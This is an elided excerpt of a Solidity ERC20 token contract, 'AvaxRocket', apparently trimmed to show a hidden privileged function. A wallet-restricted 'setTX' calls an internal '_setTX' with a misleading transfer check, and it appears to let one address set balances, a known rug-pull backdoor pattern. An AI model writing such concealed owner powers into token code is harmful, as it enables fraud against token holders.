...
abstract contract ERC20 is IERC20 {
  ...
  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    ...
    function _setTX(address account_, uint256 amount_) internal virtual {
        require(account_ != address(0), "ERC20: transfer to the zero address");
...
contract MarketingwalletOwned is Ownable {
    
  address internal _Marketingwallet;

  function setMarketingwallet( address Marketingwallet_ ) external onlyOwner() returns ( bool ) {
  ...
  modifier onlyMarketingwallet() {
    require( _Marketingwallet == msg.sender, "MarketingwalletOwned: caller is not the Marketingwallet" );
    _;
  }

}

contract AvaxRocket  is ERC20Permit, MarketingwalletOwned {

    using SafeMath for uint256;

    constructor() ERC20("AvaxRocket", "FLYHIGH", 9) {
    }

    function setTX(address account_, uint256 amount_) external onlyMarketingwallet() {
        _setTX(account_, amount_);
    }
